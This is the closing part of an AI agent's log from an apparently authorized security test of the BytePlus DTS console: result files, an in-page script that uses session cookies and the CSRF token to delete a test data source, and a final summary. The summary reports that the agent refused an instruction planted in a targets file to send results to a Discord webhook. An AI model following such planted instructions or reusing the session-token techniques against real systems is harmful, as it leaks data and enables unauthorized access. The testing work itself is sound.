+echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt; echo "=== tree ==="; find result -type f | sort; echo "=== git status ==="; git status --short | head -50
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+=== tree ===
+result/.gitkeep
+result/SUMMARY.md
+result/client-side/console.byteplus.com/dts-list/flows.md
+result/client-side/console.byteplus.com/dts-list/javascript/manifest.md
+result/client-side/console.byteplus.com/dts-list/listeners.md
+result/client-side/console.byteplus.com/dts-list/route-report.md
+result/client-side/console.byteplus.com/dts-list/sinks.md
+result/client-side/console.byteplus.com/dts-list/sources.md
+result/confirmed-vuln.txt
+result/findings/DTS-INFO-001/evidence/response.json
+result/findings/DTS-INFO-001/payloads/request.txt
+result/findings/DTS-INFO-001/report.md
+result/findings/DTS-INFO-001/response.json
+result/inventory/endpoints.md
+result/inventory/javascript.md
+result/inventory/listeners.md
+result/inventory/routes.md
+result/inventory/sinks.md
+result/logs/agent-exit-code.txt
+result/logs/agent-watchdog.txt
+result/logs/auto-restart-requested.txt
+result/logs/client-side.log
+result/logs/diagnostics-index.txt
+result/logs/opencode-reinstall-20261030T092820Z.log
+result/logs/opencode.log
+result/logs/opencode/41029612104/chrome-mcp.log
+result/logs/opencode/41029612104/diagnostics-index.txt
+result/logs/opencode/41029612104/opencode.log
+result/logs/server-side.log
+result/logs/session.md
+result/logs/target-state.txt
+result/logs/targets.sha256
+result/logs/targets.used.txt
+result/scope.md
+result/server-side/api-inventory.md
+result/server-side/notes.md
+result/server-side/test-ledger.json
+result/server-side/test-ledger.md
+result/testing-inventory.json
+result/unresolved.md
+=== git status ===
+ M result/logs/opencode.log
+ M result/logs/session.md
+ M result/logs/target-state.txt
+?? result/SUMMARY.md
+?? result/client-side/
+?? result/findings/DTS-INFO-001/evidence/
+?? result/findings/DTS-INFO-001/payloads/
+?? result/findings/DTS-INFO-001/report.md
+?? result/inventory/
+?? result/logs/client-side.log
+?? result/logs/server-side.log
+?? result/server-side/
+?? result/testing-inventory.json
+?? result/unresolved.md
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const id='2115010182613307397';\n  const r=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:id})});\n  const dt=(await r.text()).slice(0,400);\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  const lt=await l.text();\n  return {account:c.AccountID,delete:dt,listCount:(lt.match(/\"Count\":(\\d+)/)||[])[1]||lt.slice(0,200)};\n}","waitForStableDom":false}
+[0m
+[0m$ [0mcat >> result/server-side/notes.md <<'EOF'
+
+## Cleanup
+
+- Deleted the test data source created in Account A
+  (`2115010182613307397`); `ListDataSource` as A now returns `Count:0`.
+- B's pre-existing test data sources were left untouched after verification.
+EOF
+ls -la /tmp/dtsjs >/dev/null && echo "tmp js retained outside repo (ok)"
+tmp js retained outside repo (ok)
+[0m
+Completed a full authorized run against `console.byteplus.com/dts/*`.
+
+- No high-impact confirmed vulnerability found; `result/confirmed-vuln.txt` remains empty.
+- Verified and documented negatives: cross-account IDOR/BOLA, mass assignment, SSRF, CSRF, SQLi, and client-side XSS sinks.
+- `DTS-INFO-001` (internal tenant whitelist disclosure via `ListMgrCustomerParam`) is documented but explicitly excluded as low-impact info disclosure.
+- Refused the `data/targets.txt` Discord-webhook instruction (external exfiltration side effect); CI notification remains the only channel.
+- All inventory, evidence, ledgers, and `result/SUMMARY.md` are written; the temporary Account A data source was deleted.
